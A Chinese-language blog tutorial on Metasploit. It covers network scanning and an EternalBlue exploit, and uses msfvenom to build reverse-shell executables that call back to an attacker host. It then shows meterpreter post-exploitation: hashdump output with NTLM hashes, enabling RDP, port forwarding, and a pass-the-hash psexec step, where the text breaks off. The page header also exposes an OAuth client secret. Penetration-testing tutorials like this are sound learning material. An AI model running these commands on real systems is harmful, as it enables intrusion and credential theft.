<!DOCTYPE html><html><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="Metasploit 简识"><meta name="keywords" content="Metasploit"><meta name="author" content="ye1s,undefined"><meta name="copyright" content="ye1s"><title>Metasploit 简识【ye1s】</title><link rel="stylesheet" href="/css/fan.css"><link rel="stylesheet" href="/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch-theme-algolia.min.css"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4"></script><!-- link(rel="dns-prefetch" href="https://cdn.jsdelivr.net")--><!-- link(rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css")--><!-- script(src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer)--><!-- script(src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML")--><script src="/js/mathjax/mathjax.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
    tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
});
</script><script>var isPassword = '' || false;
if (isPassword) {
    if (prompt('请输入文章密码') !== '') {
        alert('密码错误！');
        history.back();
    }
}</script><script>window.GLOBAL_CONFIG = {
  root: '/',
  algolia: {"appId":"LKL6Q0GQJM","apiKey":"03829f64e2f5c11e4a5e2b8e51e24eb9","indexName":"blog","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容:${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  gitment: {"owner":"ye1sec","repo":"comments","client_id":"d5ece338867af32b6dfa","client_secret":"2caf36bbd47977524017f95105315fc9e65f0577"},
}</script><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="ye1s" type="application/atom+xml">
</head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="文章目录">站点概览</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">目录</div><div class="sidebar-toc-progress"><span class="progress-notice">您已阅读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#简介"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#基本框架"><span class="toc-number">1.1.</span> <span class="toc-text">基本框架</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msfconsole"><span class="toc-number">1.2.</span> <span class="toc-text">msfconsole</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#扫描"><span class="toc-number">2.</span> <span class="toc-text">扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#服务扫描"><span class="toc-number">2.1.</span> <span class="toc-text">服务扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞扫描"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞扫描</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞利用"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#msfdb"><span class="toc-number">4.</span> <span class="toc-text">msfdb</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#msfvenom"><span class="toc-number">5.</span> <span class="toc-text">msfvenom</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#meterpreter"><span class="toc-number">6.</span> <span class="toc-text">meterpreter</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#监听端口建立会话"><span class="toc-number">6.1.</span> <span class="toc-text">监听端口建立会话</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#基本命令"><span class="toc-number">6.2.</span> <span class="toc-text">基本命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#操作文件"><span class="toc-number">6.3.</span> <span class="toc-text">操作文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3389"><span class="toc-number">6.4.</span> <span class="toc-text">3389</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#密码哈希值"><span class="toc-number">6.5.</span> <span class="toc-text">密码哈希值</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#权限提升"><span class="toc-number">6.6.</span> <span class="toc-text">权限提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#令牌的假冒"><span class="toc-number">6.7.</span> <span class="toc-text">令牌的假冒</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#通过跳板攻击其他主机"><span class="toc-number">6.8.</span> <span class="toc-text">通过跳板攻击其他主机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#获取账户密码"><span class="toc-number">6.9.</span> <span class="toc-text">获取账户密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#脚本的使用"><span class="toc-number">6.10.</span> <span class="toc-text">脚本的使用</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/avatar.png"></div><div class="author-info-name">ye1s</div><div class="author-info-description"></div><div class="links-buttons"><a class="links-button button-hover" href="https://github.com/ye1sec" target="_blank">GitHub<i class="icon-dot bg-color8"></i></a><a class="links-button button-hover" href="mailto:431774437@qq.com" target="_blank">E-Mail<i class="icon-dot bg-color5"></i></a><a class="links-button button-hover" href="tencent://message/?uin=431774437&amp;Site=&amp;Menu=yes" target="_blank">QQ<i class="icon-dot bg-color7"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/archives"><span class="pull-top">日志</span><span class="pull-bottom">200</span></a><a class="author-info-articles-tags article-meta" href="/tags"><span class="pull-top">标签</span><span class="pull-bottom">149</span></a><a class="author-info-articles-categories article-meta" href="/categories"><span class="pull-top">分类</span><span class="pull-bottom">12</span></a></div><div class="friend-link"><a class="friend-link-text" href="http://www.m00nback.xyz/" target="_blank">MoonBack</a><a class="friend-link-text" target="_blank">待定</a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/">首页</a><a class="menu-item" href="/tags">标签</a><a class="menu-item" href="/categories">分类</a><a class="menu-item" href="/archives">归档</a><a class="menu-item" href="/about">关于</a></nav><div class="right-info"><a class="search social-icon"><i class="fas fa-search"></i><span> 搜索</span></a><a class="title-name" href="/">ye1s</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">Metasploit 简识</div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 发表于 2020-08-15 | 更新于 2020-10-31</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/Metasploit/">Metasploit</a></div></div></div><div class="main-content"><p>Metasploit 是一款比较好用的渗透工具。  </p>
<a id="more"></a>

<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><h2 id="基本框架"><a href="#基本框架" class="headerlink" title="基本框架"></a>基本框架</h2><p><img src="../../images/tool/msf/1.png" alt=""><br>MSF默认存放模块的目录如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/modules/</span><br></pre></td></tr></table></figure>
<p>模块: </p>
<ul>
<li><p>auxiliary:负责执行信息收集、扫描、嗅探、指纹识别、口令猜测和Dos攻击等功能的辅助模块</p>
</li>
<li><p>exploits:利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动、被动） </p>
</li>
<li><p>payloads:成功exploit之后，真正在目标系统执行的代码或指令。分为3种类型的payload，分别是single、stages和stagers。shellcode是特殊的payload，用于拿shell。</p>
<ul>
<li>single：all-in-one。完整的payload，这些payload都是一体化的，不需要依赖外部的库和包。</li>
<li>stagers：目标计算机内存有限时，先传输一个较小的payload用于建立连接</li>
<li>stages：利用stagers建立的连接下载后续payload </li>
</ul>
</li>
<li><p>encoders:对payload进行加密，躲避AntiVirus检查的模块</p>
</li>
<li><p>nops:提高payload稳定性及维持大小。在渗透攻击构造恶意数据缓冲区时，常常要在真正要执行的Shellcode之前添加一段空指令区， 这样当触发渗透攻击后跳转执行ShellCode时，有一个较大的安全着陆区，从而避免受到内存 地址随机化、返回地址计算偏差等原因造成的ShellCode执行失败，提高渗透攻击的可靠性。</p>
</li>
<li><p>post:后期渗透模块。在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息、跳板攻击等操作 </p>
</li>
<li><p>evasion:  自带windows denfender的混淆，免杀效果弱   </p>
</li>
</ul>
<p>基础库：</p>
<ul>
<li>Ruby扩展(REX)：处理几乎所有的核心功能，如设置网络套接字、网络的连接、格式化和所有其他基本功能。</li>
<li>MSF核心：提供了基本的应用编程接口和框架的实际核心。</li>
<li>MSF基础：对模块提供了友好的应用编程接口</li>
</ul>
<h2 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">use[Auxiliary/Exploit/Payload/Encoder]    选择一个指定的模块并使其开始工作</span><br><span class="line">show [auxiliary/exploit/payload/encoder/options] 显示可用的特定功能的模块</span><br><span class="line"><span class="built_in">set</span> [options/payload]   给某个特定的对象赋值  </span><br><span class="line">setg [options/payload]  给某个特定的对象赋值的同时设定作用域为全局，在模块进行切换的时候，该对象的值不会改变</span><br><span class="line">run   		在设定一个辅助模块需要的所有选项之后，启动该模块 </span><br><span class="line">exploit  	 启动一个渗透攻击模块 </span><br><span class="line">back      	取消当前选择的模块并且退回到上一级命令窗口 </span><br><span class="line">info 		 列出模块的相关信息 </span><br><span class="line">search  	  搜索符合条件的特定模块</span><br><span class="line">check  	   检查摸个特定目标是否易受到攻击 </span><br><span class="line">sessions      列出当前可用会话，sessions -i id 可以进入一个session交互</span><br><span class="line">load/unload：调用外部的扫描命令</span><br><span class="line">route：添加一条路由。比如发往某个子网的流量都通过攻陷的机器发送</span><br></pre></td></tr></table></figure>
<h1 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h1><p>tcp空闲扫描<br>window上运行metasploit，线程数最好不要超过16，UXNIX平台上不要超过128</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ip/ipidseq </span><br><span class="line">msf auxiliary(ipidseq) &gt; show options</span><br><span class="line">msf auxiliary(ipidseq) &gt; <span class="built_in">set</span> rhosts 192.168.2.0/24</span><br><span class="line">rhosts =&gt; 192.168.2.0/24</span><br><span class="line">msf auxiliary(ipidseq) &gt; <span class="built_in">set</span> threads 60</span><br><span class="line">threads =&gt; 60</span><br><span class="line">msf auxiliary(ipidseq) &gt; run</span><br></pre></td></tr></table></figure>
<h2 id="服务扫描"><a href="#服务扫描" class="headerlink" title="服务扫描"></a>服务扫描</h2><p>针对性扫描<br>1）服务器消息块协议扫描</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/smb/smb_version</span><br></pre></td></tr></table></figure>
<p>2）搜寻配置不当的mssql</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/mssql/mssql_ping  </span><br><span class="line">msf auxiliary(mssql_ping) &gt; <span class="built_in">set</span> rhosts 192.168.2.0/24</span><br><span class="line">rhosts =&gt; 192.168.2.0/24</span><br><span class="line">msf auxiliary(mssql_ping) &gt; <span class="built_in">set</span> threads 255</span><br><span class="line">threads =&gt; 255</span><br><span class="line">msf auxiliary(mssql_ping) &gt; run</span><br></pre></td></tr></table></figure>
<p>3）ssh服务器扫描</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf&gt;search ssh_version</span><br></pre></td></tr></table></figure>
<p>4)FTP扫描</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ftp/ftp_version   </span><br><span class="line">msf auxiliary(ftp_version) &gt; <span class="built_in">set</span> threads 255</span><br><span class="line">threads =&gt; 255</span><br><span class="line">msf auxiliary(ftp_version) &gt; <span class="built_in">set</span> rhosts 192.168.2.0/24</span><br><span class="line">rhosts =&gt; 192.168.2.0/24</span><br><span class="line">msf auxiliary(ftp_version) &gt; run</span><br></pre></td></tr></table></figure>
<p>5)简单的网络管理</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search snmp_login</span><br></pre></td></tr></table></figure>

<h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><p>ms17_010漏洞扫描  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010 <span class="comment"># 调用漏洞扫描模块</span></span><br><span class="line">show option <span class="comment"># 查看模块配置选项</span></span><br><span class="line"><span class="built_in">set</span> RHOST 192.168.1.1-254 <span class="comment"># 配置扫描目标</span></span><br><span class="line"><span class="built_in">set</span> THREADS 30 <span class="comment">#配置扫描线程</span></span><br><span class="line">run <span class="comment">#运行脚本</span></span><br></pre></td></tr></table></figure>
<p>扫描开放的vnc空口令<br>最新版的vnc服务器不再允许使用空口令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use  auxiliary/scanner/vnc/vnc_none_auth</span><br></pre></td></tr></table></figure>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>永恒之蓝  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use exploit/windows/smb/ms17_010_eternalblue <span class="comment"># 调用ms17-010永恒之蓝漏洞攻击模块</span></span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; show targets <span class="comment">#查看攻击的有效对象</span></span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; info <span class="comment">#查看详细信息 </span></span><br><span class="line">msf exploit(ms17_010_eternalblue) &gt; setg rhost 192.168.2.5 <span class="comment"># 设定全局变量的攻击目标 192.168.2.5</span></span><br><span class="line">rhost =&gt; 192.168.2.5</span><br><span class="line">msf exploit(ms17_010_eternalblue) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp <span class="comment"># 调用反弹的攻击载荷</span></span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(ms17_010_eternalblue) &gt; <span class="built_in">set</span> lhost 192.168.2.3 <span class="comment"># 设定将meterpreter反弹给192.168.2.3</span></span><br><span class="line">lhost =&gt; 192.168.2.3</span><br><span class="line">msf exploit(ms17_010_eternalblue) &gt; show options  <span class="comment"># 查询攻击参数设置</span></span><br></pre></td></tr></table></figure>
<h1 id="msfdb"><a href="#msfdb" class="headerlink" title="msfdb"></a>msfdb</h1><p>用来管理MSF的数据库的命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfdb init     <span class="comment"># start and initialize the database</span></span><br><span class="line">msfdb reinit   <span class="comment"># delete and reinitialize the database</span></span><br><span class="line">msfdb delete   <span class="comment"># delete database and stop using it</span></span><br><span class="line">msfdb start    <span class="comment"># start the database</span></span><br><span class="line">msfdb stop     <span class="comment"># stop the database</span></span><br><span class="line">msfdb status   <span class="comment"># check service status</span></span><br><span class="line">msfdb run      <span class="comment"># start the database and run msfconsole</span></span><br></pre></td></tr></table></figure>
<h1 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h1><p>基本命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -h  </span><br><span class="line">msfvenom -l payloads   查看一下payload</span><br><span class="line">msfvenom -l encoders 查看编码</span><br></pre></td></tr></table></figure>
<p>window: </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform Windows -f exe &gt; shell.exe</span><br><span class="line"> </span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.13 LPORT=3333 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>

<p>linux:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform Linux -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>
<h1 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h1><h2 id="监听端口建立会话"><a href="#监听端口建立会话" class="headerlink" title="监听端口建立会话"></a>监听端口建立会话</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1 使用handler模块</span><br><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">2 设置payload</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> PAYLOAD php/meterpreter/reverse_tcp（当时windows时php换成windows）</span><br><span class="line">PAYLOAD =&gt;php/meterpreter/reverse_tcp</span><br><span class="line">3 设置监听主机</span><br><span class="line">msfexploit(multi/handler) &gt; <span class="built_in">set</span> LHOST 192.168.88.155</span><br><span class="line">LHOST =&gt;192.168.88.155</span><br><span class="line">4 设置监听端口（默认4444）</span><br><span class="line">msfexploit(multi/handler) &gt; <span class="built_in">set</span> LPORT 4444</span><br><span class="line">LPORT =&gt; 4444</span><br><span class="line">5 发动攻击</span><br><span class="line">msfexploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure>
<h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">background  <span class="comment"># 让meterpreter处于后台模式  </span></span><br><span class="line">sessions -i index   <span class="comment"># 与会话进行交互，index表示第一个session  </span></span><br><span class="line">quit  <span class="comment"># 退出会话  </span></span><br><span class="line">shell <span class="comment"># 获得控制台权限  </span></span><br><span class="line">irb <span class="comment"># 开启ruby终端</span></span><br><span class="line">ps <span class="comment"># 查看当前活跃进程  </span></span><br><span class="line">migrate  pid <span class="comment"># 将Meterpreter会话移植到进程数位pid的进程中  </span></span><br><span class="line"><span class="built_in">kill</span> pid <span class="comment"># 杀死进程  </span></span><br><span class="line">getpid <span class="comment"># 获取当前进程的pid  </span></span><br><span class="line">sysinfo <span class="comment"># 查看目标机系统信息，如机器名，操作系统等  </span></span><br><span class="line">shutdown <span class="comment"># 关机</span></span><br><span class="line">screenshot 截屏</span><br><span class="line">sysinfo  系统运行的平台信息</span><br><span class="line">getuid  查看权限</span><br><span class="line">getwd 获取目标机器的工作目录</span><br><span class="line">getlwd 得到当前系统的工作目录 </span><br><span class="line">run post/windows/gather/checkvm 确定是不是虚拟机</span><br></pre></td></tr></table></figure>
<h2 id="操作文件"><a href="#操作文件" class="headerlink" title="操作文件"></a>操作文件</h2><p>上传文件到目标主机和下载目标文件 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload /root/1.txt c:\\</span><br><span class="line">[*] uploading  : /root/1.txt -&gt; c:\</span><br><span class="line">[*] uploaded   : /root/1.txt -&gt; c:\\1.txt</span><br><span class="line"></span><br><span class="line">meterpreter &gt; download c:/2.txt /root </span><br><span class="line">[*] Downloading: c:/2.txt -&gt; /root/2.txt</span><br><span class="line">[*] Downloaded 5.00 B of 5.00 B (100.0%): c:/2.txt -&gt; /root/2.txt</span><br><span class="line">[*] download   : c:/2.txt -&gt; /root/2.txt</span><br></pre></td></tr></table></figure>
<p>搜索目标主机上的文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; search -h </span><br><span class="line">Usage: search [-d dir] [-r recurse] -f pattern [-f pattern]...</span><br><span class="line">Search <span class="keyword">for</span> files.</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -d &lt;opt&gt;  The directory/drive to begin searching from. Leave empty to search all drives. (Default: )</span><br><span class="line">    -f &lt;opt&gt;  A file pattern glob to search <span class="keyword">for</span>. (e.g. *secret*.doc?)</span><br><span class="line">    -h        Help Banner.</span><br><span class="line">    -r &lt;opt&gt;  Recursivly search sub directories. (Default: <span class="literal">true</span>)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; search -d c:\\  -r flase -f *.txt</span><br><span class="line">Found 2 results...</span><br><span class="line">    c:\1.txt (2 bytes)</span><br><span class="line">    c:\2.txt (5 bytes)</span><br></pre></td></tr></table></figure>

<h2 id="3389"><a href="#3389" class="headerlink" title="3389"></a>3389</h2><p>开3389</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/enable_rdp</span><br><span class="line"></span><br><span class="line">[*] Enabling Remote Desktop</span><br><span class="line">[*] 	RDP is disabled; enabling it ...</span><br><span class="line">[*] Setting Terminal Services service startup mode</span><br><span class="line">[*] 	The Terminal Services service is not <span class="built_in">set</span> to auto, changing it to auto ...</span><br><span class="line">[*] 	Opening port <span class="keyword">in</span> <span class="built_in">local</span> firewall <span class="keyword">if</span> necessary</span><br><span class="line">[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20180430181213_default_192.168.1.187_host.windows.cle_516653.txt</span><br><span class="line">meterpreter &gt; netstat -ano</span><br><span class="line"></span><br><span class="line">Connection list</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">    Proto  Local address        Remote address      State        User  Inode  PID/Program name</span><br><span class="line">    -----  -------------        --------------      -----        ----  -----  ----------------</span><br><span class="line">    tcp    0.0.0.0:135          0.0.0.0:*           LISTEN       0     0      696/svchost.exe</span><br><span class="line">    tcp    0.0.0.0:445          0.0.0.0:*           LISTEN       0     0      4/System</span><br><span class="line">    tcp    0.0.0.0:3389         0.0.0.0:*           LISTEN       0     0      1040/svchost.exe</span><br></pre></td></tr></table></figure>
<p>远程主机的3389的端口映射到本机的1235号端口</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -l 1234 -r 192.168.1.187 -p 3389</span><br><span class="line">[*] Local TCP relay created: :1234 &lt;-&gt; 192.168.1.187:3389</span><br></pre></td></tr></table></figure>
<h2 id="密码哈希值"><a href="#密码哈希值" class="headerlink" title="密码哈希值"></a>密码哈希值</h2><p>获取密码哈希值<br>aad3b435开头的哈希值是一个空的或者不存在的哈希值–空字符串的占位符</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use priv</span><br><span class="line">[-] The <span class="string">'priv'</span> extension has already been loaded.</span><br><span class="line">meterpreter &gt; run  post/windows/gather/hashdump</span><br><span class="line"></span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 24a05299b237d9f48c9eff1c6a88a57e...</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">No users with password hints on this system</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:db3dd3018cff8541ab7168f899737020:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>
<p>用得到的管理员的用户哈希值登录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf exploit(windows/smb/psexec) &gt; 